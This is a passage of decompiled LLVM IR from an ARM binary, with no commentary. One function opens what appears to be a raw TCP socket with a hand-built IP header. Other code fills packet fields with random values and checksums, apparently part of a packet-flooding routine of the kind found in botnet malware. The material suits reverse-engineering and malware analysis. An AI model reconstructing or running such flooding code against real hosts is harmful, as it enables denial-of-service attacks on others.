  %v0_8de0 = call i32 @function_e0b8()
  store i32 %v2_8de4, i32* %r1.global-to-local, align 4
  store i32 %v0_8de0, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8df0 = load i32, i32* @r7, align 4
  store i32 %v0_8df0, i32* %r0.global-to-local, align 4
  %v3_8df4 = call i32 @function_1038c(i32 %v0_8df0, i32 %v2_8de4, i32 4)
  %v0_8df8 = load i32, i32* @r7, align 4
  %v1_8df8 = add i32 %v0_8df8, 6
  store i32 %v1_8df8, i32* %r0.global-to-local, align 4
  store i32 %v2_8dfc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e04 = call i32 @function_1038c(i32 %v1_8df8, i32 %v2_8dfc, i32 4)
  %v0_8e08 = load i32, i32* @r7, align 4
  %v1_8e08 = add i32 %v0_8e08, 4
  store i32 %v1_8e08, i32* %r0.global-to-local, align 4
  store i32 %v2_8e0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e14 = call i32 @function_1038c(i32 %v1_8e08, i32 %v2_8e0c, i32 2)
  store i32 %v2_8e18, i32* %r1.global-to-local, align 4
  %v0_8e1c = load i32, i32* @r7, align 4
  %v1_8e1c = add i32 %v0_8e1c, 10
  store i32 %v1_8e1c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e24 = call i32 @function_1038c(i32 %v1_8e1c, i32 %v2_8e18, i32 2)
  store i32 %v3_8e24, i32* %r0.global-to-local, align 4
  store i32 %v1_8a74, i32* %r1.global-to-local, align 4
  store i1 %v2_8e2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e2c, label %dec_label_pc_8e34, label %dec_label_pc_8fbc

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8dd0, %dec_label_pc_8fbc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e38 = load i32, i32* @r5, align 4
  %v3_8e38 = add i32 %v2_8e38, 10
  %v4_8e38 = inttoptr i32 %v3_8e38 to i16*
  store i16 0, i16* %v4_8e38, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r5, align 4
  store i32 %v0_8e40, i32* @r0, align 4
  %v2_8e44 = call i32 @function_c848(i32 %v0_8e40, i32 20)
  %v3_8e44 = trunc i32 %v2_8e44 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e4c = load i32, i32* @r5, align 4
  %v4_8e4c = add i32 %v3_8e4c, 10
  %v5_8e4c = inttoptr i32 %v4_8e4c to i16*
  store i16 %v3_8e44, i16* %v5_8e4c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e54 = trunc i32 %v0_8e54 to i16
  %v2_8e54 = load i32, i32* @r6, align 4
  %v3_8e54 = add i32 %v2_8e54, 10
  %v4_8e54 = inttoptr i32 %v3_8e54 to i16*
  store i16 %v1_8e54, i16* %v4_8e54, align 2
  %v0_8e58 = load i32, i32* @r6, align 4
  store i32 %v0_8e58, i32* @r0, align 4
  %v2_8e5c = call i32 @function_c848(i32 %v0_8e58, i32 20)
  %v3_8e5c = trunc i32 %v2_8e5c to i16
  store i32 %v2_8e5c, i32* %r0.global-to-local, align 4
  %v3_8e60 = load i32, i32* @r6, align 4
  %v4_8e60 = add i32 %v3_8e60, 10
  %v5_8e60 = inttoptr i32 %v4_8e60 to i16*
  store i16 %v3_8e5c, i16* %v5_8e60, align 2
  store i32 0, i32* @r4, align 4
  %v0_8e68 = load i32, i32* @r8, align 4
  store i32 %v0_8e68, i32* @r1, align 4
  %v1_8e6c = add i32 %v0_8e68, 4
  %v2_8e6c = inttoptr i32 %v1_8e6c to i16*
  %v3_8e6c = load i16, i16* %v2_8e6c, align 2
  %v4_8e6c = zext i16 %v3_8e6c to i32
  store i32 %v4_8e6c, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8e74 = add i32 %v0_8e68, 6
  %v4_8e74 = inttoptr i32 %v3_8e74 to i16*
  store i16 0, i16* %v4_8e74, align 2
  %v0_8e78 = load i32, i32* @r6, align 4
  store i32 %v0_8e78, i32* %r0.global-to-local, align 4
  %v4_8e7c = call i32 @function_c898(i32 %v0_8e78, i32 %v0_8e68, i32 %v4_8e6c, i32 %stack_var_-136.0.ph)
  %v5_8e7c = trunc i32 %v4_8e7c to i16
  store i32 %v4_8e7c, i32* %r0.global-to-local, align 4
  %v3_8e80 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8e80, i32* %r2.global-to-local, align 4
  %v3_8e84 = mul i32 %v3_8e80, 32
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v0_8e88 = load i32, i32* @r5, align 4
  %v1_8e88 = add i32 %v0_8e88, 16
  %v2_8e88 = inttoptr i32 %v1_8e88 to i32*
  %v3_8e88 = load i32, i32* %v2_8e88, align 4
  %v5_8e8c = mul i32 %v3_8e80, 24
  store i32 %v5_8e8c, i32* %r3.global-to-local, align 4
  %v1_8e90 = load i32, i32* @sb, align 4
  %v2_8e90 = add i32 %v1_8e90, %v5_8e8c
  store i32 %v2_8e90, i32* @lr, align 4
  %v2_8e94 = add i32 %v2_8e90, 4
  %v3_8e94 = inttoptr i32 %v2_8e94 to i32*
  store i32 %v3_8e88, i32* %v3_8e94, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8e9c = load i32, i32* @r8, align 4
  %v4_8e9c = add i32 %v3_8e9c, 6
  %v5_8e9c = inttoptr i32 %v4_8e9c to i16*
  store i16 %v5_8e7c, i16* %v5_8e9c, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ea4 = trunc i32 %v0_8ea4 to i16
  %v2_8ea4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ea4 = load i32, i32* @sb, align 4
  %v4_8ea4 = add i32 %v3_8ea4, %v2_8ea4
  %v5_8ea4 = inttoptr i32 %v4_8ea4 to i16*
  store i16 %v1_8ea4, i16* %v5_8ea4, align 2
  %v0_8ea8 = load i32, i32* @r4, align 4
  %v1_8ea8 = trunc i32 %v0_8ea8 to i16
  %v2_8ea8 = load i32, i32* @lr, align 4
  %v3_8ea8 = add i32 %v2_8ea8, 2
  %v4_8ea8 = inttoptr i32 %v3_8ea8 to i16*
  store i16 %v1_8ea8, i16* %v4_8ea8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8eb0 = load i32, i32* @r5, align 4
  store i32 %v0_8eb0, i32* %r1.global-to-local, align 4
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8ebc = load i32, i32* @lr, align 4
  %v0_8ec0 = load i32, i32* %ip.global-to-local, align 4
  %v6_8ec4 = call i32 @function_11570(i32 %v3_8abc, i32 %v0_8eb0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8ebc, i32 %v0_8ec0)
  %v3_8ec8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec8, i32* %r3.global-to-local, align 4
  %v1_8ecc = add i32 %v3_8ec8, 1
  store i32 %v1_8ecc, i32* %r0.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sl, align 4
  %v9_8ed0 = icmp eq i32 %v1_8ecc, %v1_8ed0
  store i1 %v9_8ed0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8ecc, i32* %stack_var_-44, align 4
  %v6_8ed8 = icmp slt i32 %v1_8ecc, %v1_8ed0
  br i1 %v6_8ed8, label %dec_label_pc_8d5c, label %dec_label_pc_8d48

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8d5c
  %v1_8ee0 = add i32 %v2_8d64, 16
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r4.global-to-local, align 4
  %v0_8ee4 = call i32 @function_e0b8()
  store i32 %v0_8ee4, i32* %r0.global-to-local, align 4
  %v3_8ee8 = load i32, i32* %stack_var_-44, align 4
  %v5_8ef0 = mul i32 %v3_8ee8, 24
  %v0_8ef4 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ef4 = and i32 %v0_8ef4, 16711680
  store i32 %v1_8ef4, i32* %ip.global-to-local, align 4
  %v3_8ef8 = udiv i32 %v0_8ef4, 16777216
  %v4_8efc = udiv i32 %v1_8ef4, 256
  %v5_8efc = or i32 %v4_8efc, %v3_8ef8
  store i32 %v5_8efc, i32* %r2.global-to-local, align 4
  %v1_8f00 = load i32, i32* @sb, align 4
  %v2_8f00 = add i32 %v1_8f00, %v5_8ef0
  store i32 %v2_8f00, i32* %r1.global-to-local, align 4
  %v1_8f04 = and i32 %v0_8ef4, 65280
  store i32 %v1_8f04, i32* %r3.global-to-local, align 4
  %v1_8f08 = add i32 %v2_8f00, 20
  %v2_8f08 = inttoptr i32 %v1_8f08 to i8*
  %v3_8f08 = load i8, i8* %v2_8f08, align 1
  %v4_8f08 = zext i8 %v3_8f08 to i32
  store i32 %v4_8f08, i32* %ip.global-to-local, align 4
  %v5_8f10 = call i32 @llvm.bswap.i32(i32 %v0_8ef4)
  %v7_8f14 = lshr i32 %v0_8ee4, %v4_8f08
  %v8_8f14 = add i32 %v7_8f14, %v5_8f10
  store i32 %v8_8f14, i32* %r2.global-to-local, align 4
  %v1_8f18 = and i32 %v8_8f14, 16711680
  store i32 %v1_8f18, i32* %r0.global-to-local, align 4
  store i32 %v6_8aa8, i32* %r1.global-to-local, align 4
  %v5_8f30 = call i32 @llvm.bswap.i32(i32 %v8_8f14)
  store i32 %v5_8f30, i32* %r3.global-to-local, align 4
  store i1 %v7_8d8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f38 = load i32, i32* @r5, align 4
  %v2_8f38 = add i32 %v1_8f38, 16
  %v3_8f38 = inttoptr i32 %v2_8f38 to i32*
  store i32 %v5_8f30, i32* %v3_8f38, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8f40, label %dec_label_pc_8d94

dec_label_pc_8f40:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8d88
  %v0_8f40 = call i32 @function_e0b8()
  store i32 %v0_8f40, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f4c = load i32, i32* @fp, align 4
  %v9_8f4c = icmp eq i32 %v0_8f4c, 65535
  store i1 %v9_8f4c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f50 = load i32, i32* @r5, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v0_8f40, i32* %v3_8f50, align 4
  br i1 %v9_8f4c, label %dec_label_pc_8f58, label %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge

dec_label_pc_8f40.dec_label_pc_8da4_crit_edge:    ; preds = %dec_label_pc_8f40
  %v1_8da8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8da4

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f40, %dec_label_pc_8d94
  %v0_8f58 = call i32 @function_e0b8()
  %v3_8f60 = urem i32 %v0_8f58, 65536
  store i32 %v3_8f60, i32* %r0.global-to-local, align 4
  store i32 %v3_8b08, i32* %r2.global-to-local, align 4
  %v1_8f6c = sub nsw i32 999, %v3_8f60
  store i32 %v1_8f6c, i32* %r3.global-to-local, align 4
  %v1_8f70 = load i32, i32* %r4.global-to-local, align 4
  %v9_8f70 = icmp eq i32 %v3_8b08, %v1_8f70
  store i1 %v9_8f70, i1* %cpsr_z.global-to-local, align 1
  %v1_8f74 = trunc i32 %v0_8f58 to i16
  %v2_8f74 = load i32, i32* @r5, align 4
  %v3_8f74 = add i32 %v2_8f74, 4
  %v4_8f74 = inttoptr i32 %v3_8f74 to i16*
  store i16 %v1_8f74, i16* %v4_8f74, align 2
  %v0_8f78 = load i32, i32* %r3.global-to-local, align 4
  %v1_8f78 = trunc i32 %v0_8f78 to i16
  %v2_8f78 = load i32, i32* @r6, align 4
  %v3_8f78 = add i32 %v2_8f78, 4
  %v4_8f78 = inttoptr i32 %v3_8f78 to i16*
  store i16 %v1_8f78, i16* %v4_8f78, align 2
  br i1 %v9_8f70, label %dec_label_pc_8f80, label %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge

dec_label_pc_8f58.dec_label_pc_8db0_crit_edge:    ; preds = %dec_label_pc_8f58
  %v1_8db4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8db0

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f58, %dec_label_pc_8da4
  %v0_8f80 = call i32 @function_e0b8()
  %v1_8f80 = trunc i32 %v0_8f80 to i16
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 %v3_8b0c, i32* %r3.global-to-local, align 4
  %v1_8f88 = load i32, i32* %r4.global-to-local, align 4
  %v9_8f88 = icmp eq i32 %v3_8b0c, %v1_8f88
  store i1 %v9_8f88, i1* %cpsr_z.global-to-local, align 1
  %v3_8f8c = load i32, i32* @r5, align 4
  %v4_8f8c = add i32 %v3_8f8c, 58
  %v5_8f8c = inttoptr i32 %v4_8f8c to i16*
  store i16 %v1_8f80, i16* %v5_8f8c, align 2
  br i1 %v9_8f88, label %dec_label_pc_8f94, label %dec_label_pc_8dbc

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8db0
  %v0_8f94 = call i32 @function_e0b8()
  %v1_8f94 = trunc i32 %v0_8f94 to i16
  store i32 %v0_8f94, i32* %r0.global-to-local, align 4
  store i32 %v1_8b00, i32* @r4, align 4
  store i1 %v2_8f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f9c, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8f94
  %v3_8fa432 = load i32, i32* @r8, align 4
  %v4_8fa433 = add i32 %v3_8fa432, 2
  %v5_8fa434 = inttoptr i32 %v4_8fa433 to i16*
  store i16 %v1_8f94, i16* %v5_8fa434, align 2
  br label %dec_label_pc_8fb0

bb88:                                             ; preds = %dec_label_pc_8f94
  %v1_8fa0 = load i32, i32* @r5, align 4
  %v2_8fa0 = add i32 %v1_8fa0, 16
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  %v4_8fa0 = load i32, i32* %v3_8fa0, align 4
  store i32 %v4_8fa0, i32* %r3.global-to-local, align 4
  %v3_8fa4 = load i32, i32* @r8, align 4
  %v4_8fa4 = add i32 %v3_8fa4, 2
  %v5_8fa4 = inttoptr i32 %v4_8fa4 to i16*
  store i16 %v1_8f94, i16* %v5_8fa4, align 2
  %v1_8fa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fa8 = load i32, i32* @r6, align 4
  %v3_8fa8 = add i32 %v2_8fa8, 16
  %v4_8fa8 = inttoptr i32 %v3_8fa8 to i32*
  store i32 %v1_8fa8, i32* %v4_8fa8, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8fb0:                                ; preds = %.thread31, %dec_label_pc_8dbc
  %v0_8fb0 = call i32 @function_e0b8()
  store i32 %v0_8fb0, i32* %r0.global-to-local, align 4
  %v1_8fb4 = load i32, i32* @r6, align 4
  %v2_8fb4 = add i32 %v1_8fb4, 16
  %v3_8fb4 = inttoptr i32 %v2_8fb4 to i32*
  store i32 %v0_8fb0, i32* %v3_8fb4, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8fbc:                                ; preds = %dec_label_pc_8dd0
  %v0_8fbc = load i32, i32* @r8, align 4
  %v1_8fbc = add i32 %v0_8fbc, 8
  store i32 %v1_8fbc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a54, i32* %r1.global-to-local, align 4
  %v2_8fc4 = inttoptr i32 %v1_8fbc to i16*
  %v3_8fc4 = call i32 @function_e24c(i16* %v2_8fc4, i32 %v6_8a54)
  store i32 %v3_8fc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e34

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8acc
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  %v1_8fd0 = call i32 @function_10ddc(i32 %v3_8abc)
  store i32 %v1_8fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_896c, %dec_label_pc_8fcc
  %v1_8fdc = phi i32 [ %v3_8abc, %dec_label_pc_896c ], [ %v1_8fd0, %dec_label_pc_8fcc ]
  store i32 %v3_896c, i32* %r4.global-to-local, align 4
  store i32 %v6_896c, i32* %r5.global-to-local, align 4
  store i32 %v24_896c, i32* %fp.global-to-local, align 4
  ret i32 %v1_8fdc

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8af4
  %v1_8fe8 = add i32 %v6_8a54, 8
  store i32 %v1_8fe8, i32* %r1.global-to-local, align 4
  %v1_8fec = add i32 %v6_8a54, 66
  store i32 %v1_8fec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d48.preheader

; uselistorder directives
  uselistorder i32 %v1_8fec, { 1, 0 }
  uselistorder i32 %v1_8fe8, { 1, 0 }
  uselistorder i16 %v1_8f94, { 1, 0 }
  uselistorder i32 %v0_8f94, { 1, 0 }
  uselistorder i32 %v0_8f80, { 1, 0 }
  uselistorder i32 %v3_8f60, { 1, 0 }
  uselistorder i32 %v0_8f58, { 1, 0 }
  uselistorder i32 %v5_8f30, { 1, 0 }
  uselistorder i32 %v0_8ef4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8ed0, { 1, 2, 0 }
  uselistorder i32 %v1_8ecc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8e80, { 1, 0, 2 }
  uselistorder i32 %v4_8e7c, { 1, 0 }
  uselistorder i32 %v0_8e68, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e5c, { 1, 0 }
  uselistorder i32 %v7_8d70, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8d8c, { 2, 1, 0 }
  uselistorder i1 %v2_8f9c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8ce0, { 1, 0, 2 }
  uselistorder i32 %v3_8b5c, { 1, 0 }
  uselistorder i32 %v3_8b40, { 1, 2, 0 }
  uselistorder i32 %v1_8b3c, { 1, 0 }
  uselistorder i32 %v1_8b00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8afc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8af8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8af4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8aec, { 1, 0 }
  uselistorder i1 %v7_8ac0, { 1, 0 }
  uselistorder i32 %v3_8abc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8aa8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8a74, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a54, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a08, { 1, 2, 0 }
  uselistorder i32 %v1_89e4, { 3, 2, 1, 0 }
  uselistorder i32 %v6_89dc, { 1, 0 }
  uselistorder i32 %v6_89a0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8988, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 5, 8, 9, 11, 12, 10, 14, 13, 16, 15, 17, 4, 18, 19, 21, 20, 22, 23, 24, 25, 27, 26, 3, 28, 29, 32, 30, 31, 2, 1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 1, 0 }
  uselistorder label %dec_label_pc_8dd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d48.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_9000(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9000:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9000 = load i32, i32* @r4, align 4
  %v6_9000 = load i32, i32* @r5, align 4
  %v24_9000 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_901c = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_9020 = load i32, i32* @r5, align 4
  store i32 %v0_9020, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9030 = load i32, i32* @r4, align 4
  %v5_9034 = inttoptr i32 %v0_9020 to i32*
  %v6_9034 = call i32 @function_8570(i32 %v0_9030, i32* %v5_9034, i32 2, i32 0, i32 %v2_901c)
  %v1_9040 = urem i32 %v6_9034, 256
  store i32 %v1_9040, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_904c = load i32, i32* @r5, align 4
  store i32 %v0_904c, i32* %r1.global-to-local, align 4
  %v0_9050 = load i32, i32* @r4, align 4
  %v5_9054 = trunc i32 %v6_9034 to i8
  %v6_9058 = inttoptr i32 %v0_904c to i32*
  %v7_9058 = call i32 @function_8570(i32 %v0_9050, i32* %v6_9058, i32 3, i32 65535, i32 %v6_9034)
  %v0_905c = load i32, i32* @r5, align 4
  store i32 %v0_905c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9058, i32* %fp.global-to-local, align 4
  %v0_906c = load i32, i32* @r4, align 4
  %v5_9070 = inttoptr i32 %v0_905c to i32*
  %v6_9070 = call i32 @function_8570(i32 %v0_906c, i32* %v5_9070, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9078 = urem i32 %v6_9070, 256
  store i32 %v1_9078, i32* %ip.global-to-local, align 4
  %v0_907c = load i32, i32* @r5, align 4
  store i32 %v0_907c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9088 = load i32, i32* @r4, align 4
  %v6_9090 = inttoptr i32 %v0_907c to i32*
  %v7_9090 = call i32 @function_8570(i32 %v0_9088, i32* %v6_9090, i32 5, i32 1, i32 %v1_9078)
  %v1_909c = urem i32 %v7_9090, 256
  store i32 %v1_909c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90a8 = load i32, i32* @r5, align 4
  store i32 %v0_90a8, i32* %r1.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b4 = inttoptr i32 %v0_90a8 to i32*
  %v6_90b4 = call i32 @function_8570(i32 %v0_90ac, i32* %v5_90b4, i32 6, i32 65535, i32 %v1_909c)
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90b4, i32* @r8, align 4
  %v0_90cc = load i32, i32* @r4, align 4
  %v5_90d0 = inttoptr i32 %v0_90bc to i32*
  %v6_90d0 = call i32 @function_8570(i32 %v0_90cc, i32* %v5_90d0, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_90d4 = load i32, i32* @r5, align 4
  store i32 %v0_90d4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_90d0, i32* @r7, align 4
  %v0_90e4 = load i32, i32* @r4, align 4
  %v5_90e8 = inttoptr i32 %v0_90d4 to i32*
  %v6_90e8 = call i32 @function_8570(i32 %v0_90e4, i32* %v5_90e8, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90f8 = load i32, i32* @r5, align 4
  store i32 %v0_90f8, i32* %r1.global-to-local, align 4
  %v0_90fc = load i32, i32* @r4, align 4
  %v5_9100 = inttoptr i32 %v0_90f8 to i32*
  %v6_9100 = call i32 @function_8570(i32 %v0_90fc, i32* %v5_9100, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9108 = urem i32 %v6_9100, 256
  store i32 %v1_9108, i32* %ip.global-to-local, align 4
  %v0_910c = load i32, i32* @r5, align 4
  store i32 %v0_910c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9118 = load i32, i32* @r4, align 4
  %v5_9120 = inttoptr i32 %v0_910c to i32*
  %v6_9120 = call i32 @function_8570(i32 %v0_9118, i32* %v5_9120, i32 19, i32 0, i32 %v1_9108)
  %v0_9128 = load i32, i32* @r5, align 4
  store i32 %v0_9128, i32* %r1.global-to-local, align 4
  %v2_912c = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_912c, i32* %r3.global-to-local, align 4
  store i32 %v6_9120, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9138 = load i32, i32* @r4, align 4
  %v5_913c = inttoptr i32 %v0_9128 to i32*
  %v6_913c = call i32 @function_8570(i32 %v0_9138, i32* %v5_913c, i32 25, i32 %v2_912c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9150 = call i32 @function_115f4(i32 2, i32 3, i32 6)
  %v7_9154 = icmp eq i32 %v3_9150, -1
  store i1 %v7_9154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9154, label %dec_label_pc_95f4, label %dec_label_pc_9160

dec_label_pc_9160:                                ; preds = %dec_label_pc_9000
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9168 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9168, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_917c = call i32 @function_115b0(i32 %v3_9150, i32 0, i32 3, i32 %v6_9168, i32 4)
  %v7_9180 = icmp eq i32 %v5_917c, -1
  store i1 %v7_9180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9180, label %dec_label_pc_95ec, label %dec_label_pc_9188

dec_label_pc_9188:                                ; preds = %dec_label_pc_9160
  %v0_9188 = load i32, i32* @r8, align 4
  %v0_918c = load i32, i32* @r7, align 4
  %v0_9190 = load i32, i32* %fp.global-to-local, align 4
  %v0_9194 = load i32, i32* @r6, align 4
  %v1_9194 = urem i32 %v0_9194, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_919c = urem i32 %v0_9188, 65536
  store i32 %v3_919c, i32* %r3.global-to-local, align 4
  %v3_91a0 = urem i32 %v0_918c, 65536
  store i32 %v3_91a0, i32* %r4.global-to-local, align 4
  %v0_91a4 = load i32, i32* @sl, align 4
  %v2_91a4 = icmp eq i32 %v0_91a4, 0
  store i1 %v2_91a4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91bc = urem i32 %v0_9190, 65536
  store i32 %v3_91bc, i32* @fp, align 4
  br i1 %v2_91a4, label %dec_label_pc_9600, label %dec_label_pc_91cc

dec_label_pc_91cc:                                ; preds = %dec_label_pc_9188
